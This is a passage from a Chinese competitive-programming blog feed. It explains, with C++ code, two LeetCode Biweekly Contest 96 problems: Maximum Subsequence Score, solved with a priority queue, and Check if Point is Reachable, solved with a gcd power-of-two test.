<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-96/problems/maximum-subsequence-score/">https://leetcode.cn/contest/biweekly-contest-96/problems/maximum-subsequence-score/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>优先队列
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>本题与<a href="https://leetcode.cn/problems/kth-largest-element-in-a-stream/">703. 数据流中的第 K 大元素</a>题几乎一模一样。我们可以枚举 $nums_2$ 中的最小值，我们将两个数组进行排序按照 $nums_2$ 中的元素从大到小进行排序即可：</li>
</ol>
<ul>
<li>我们从 $ j \in [k - 1, n - 1]$ 开始枚举 $nums_2$，此时我们只需求出  $nums_1$ 中前 $j$ 个元素中的最大的 $k$ 个元素的和即可；</li>
<li>我们按照上述方法进行枚举即可，我们用优先队列处理经典的 $topk$ 问题即可。</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \log k)$，$n$ 表示数组的长度，$k$ 表示给定的数字。</li>
<li>空间复杂度：时间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maxScore</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums1.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(nums2[i], nums1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>(), [&amp;](pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;a, pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;b) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.first == b.first) &#123;</span><br><span class="line">               <span class="keyword">return</span> a.second &lt; b.second;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">return</span> a.first &lt; b.first;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; pq;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            pq.<span class="built_in">emplace</span>(arr[i].second);</span><br><span class="line">            sum += arr[i].second;</span><br><span class="line">            <span class="keyword">if</span> (pq.<span class="built_in">size</span>() &gt;= k) &#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res, sum * arr[i].first);</span><br><span class="line">                <span class="type">int</span> curr = pq.<span class="built_in">top</span>();</span><br><span class="line">                pq.<span class="built_in">pop</span>();</span><br><span class="line">                sum -= curr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2543-判断一个点是否可以到达"><a href="#2543-判断一个点是否可以到达" class="headerlink" title="2543. 判断一个点是否可以到达"></a>2543. 判断一个点是否可以到达</h3><p>给你一个无穷大的网格图。一开始你在 <code>(1, 1)</code> ，你需要通过有限步移动到达点 <code>(targetX, targetY)</code> 。</p>
<p><strong>每一步</strong> ，你可以从点 <code>(x, y)</code> 移动到以下点之一：</p>
<ul>
<li><code>(x, y - x)</code></li>
<li><code>(x - y, y)</code></li>
<li><code>(2 * x, y)</code></li>
<li><code>(x, 2 * y)</code></li>
</ul>
<p>给你两个整数 <code>targetX</code> 和 <code>targetY</code> ，分别表示你最后需要到达点的 X 和 Y 坐标。如果你可以从 <code>(1, 1)</code> 出发到达这个点，请你返回<code>true</code> ，否则返回 <code>false</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：targetX = 6, targetY = 9</span><br><span class="line">输出：false</span><br><span class="line">解释：没法从 (1,1) 出发到达 (6,9) ，所以返回 false 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：targetX = 4, targetY = 7</span><br><span class="line">输出：true</span><br><span class="line">解释：你可以按照以下路径到达：(1,1) -&gt; (1,2) -&gt; (1,4) -&gt; (1,8) -&gt; (1,7) -&gt; (2,7) -&gt; (4,7) 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= targetX, targetY &lt;= 109</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-96/problems/check-if-point-is-reachable/">https://leetcode.cn/contest/biweekly-contest-96/problems/check-if-point-is-reachable/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 数学</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>确实是非常棒的数学题目，根据题意可以知道 $(x,y)$ 经过一步变换可以到达 $(g(x), g(y))$:</li>
</ol>
<ul>
<li>$(x, y - x), (x - y, x)$，此时 $\gcd(x, y-x) &#x3D; \gcd(x, y),\gcd(x - y, y) &#x3D; \gcd(x, y)$，则可以知道如果向下移动或者向左移动则二者的最大公约数保持不变；</li>
<li>$(x, 2y), (2x, y)$，此时若变为 $(x,2y)$ 时，如果 $y$ 为奇数时，$x$ 为偶数此时 $\gcd(x, 2y) &#x3D; 2\gcd(x,y)$，则此时有可能会将二者的公约数的倍数乘以 $2$，要么继续保持不变；</li>
<li>因此综上我们可以推理出来经过上述的变换二者的公约数要么保持不变，要么最大公约数为原来的 $2$ 倍，由于 $(1,1)$ 的公约数不变，综上我们可以知道 $(targetX, targetY)$ 的最大公约数要么为 $1$，要么为 $2$ 的倍数；</li>
</ul>
<p>此时我们也可以反向思考，可以参考「<a href="https://leetcode.cn/problems/check-if-point-is-reachable/solutions/2073571/by-stormsunshine-6ydj/">题解</a>」。我们进行反向模拟，此时 $(x, y)$ 的坐标需要逐步缩小，$(x,y)$ 经过一步变换后变为:</p>
<ul>
<li>$(x, x + y), (x + y, x)$，此时二者的最大公约数保持不变，即 $\gcd(x, y) &#x3D; \gcd(x, x + y) &#x3D; \gcd(x + y, y)$；</li>
<li>$(x, \frac{y}{2})$ 或者 $(\frac{x}{2}, y)$，此时二者的公约数要么继续保持不变，要么二者的公约数为 $\gcd(x,y)$ 的一半。</li>
<li>如果 $(x, y)$ 中存在任意的数位偶数，我们总可以通过除法变换，将 $(x,y)$ 全部变为奇数，此时我们分类讨论:<ul>
<li>如果 $x &#x3D; y$，则此时我们无论通过何种变换都无法再将坐标进行缩小；</li>
<li>如果 $x \neq y$，假设 $x &lt; y$，则我们可以将 $(x,y)$ 变换为 $(x, \frac{x + y}{2})$，此时 $\frac{x + y}{2} &lt; y$，这样我们就将纵坐标进行了缩小，同时我们此时可以得到 $\gcd(x,y) &#x3D; \gcd(x, \frac{x + y}{2}) &#x3D; 1$；同理如果 $x &gt; y$，我们可以将横坐标缩小；<br>我们直接通过上述的模拟方法即可判断坐标是否可以完成还原。</li>
</ul>
</li>
</ul>
<ol start="2">
<li>我觉得如果要证明这个结论正确的话，需要分为两步:</li>
</ol>
<ul>
<li>如果 $(targetX, targetY) &#x3D; 2^k$，则此时一定可以到达 $(1,1)$；</li>
<li>如果 $(targetX, targetY) \neq 2^k$，则此时一定不能到达 $(1,1)$；</li>
</ul>
<ol start="3">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(\log n)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ol>
<li>数学计算<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isReachable</span><span class="params">(<span class="type">int</span> targetX, <span class="type">int</span> targetY)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> x = __gcd(targetX, targetY);</span><br><span class="line">        <span class="keyword">return</span> (x &amp; (x - <span class="number">1</span>)) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>模拟<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isReachable</span><span class="params">(<span class="type">int</span> targetX, <span class="type">int</span> targetY)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((targetX &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">isReachable</span>(targetX / <span class="number">2</span>, targetY);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((targetY &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">isReachable</span>(targetX, targetY / <span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (targetX == targetY) &#123;</span><br><span class="line">                <span class="keyword">return</span> targetX == <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (targetX &gt; targetY) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">isReachable</span>((targetX + targetY) / <span class="number">2</span>, targetY);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">isReachable</span>(targetX, (targetX + targetY) / <span class="number">2</span>);</span><br><span class="line">                &#125;                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
</search>
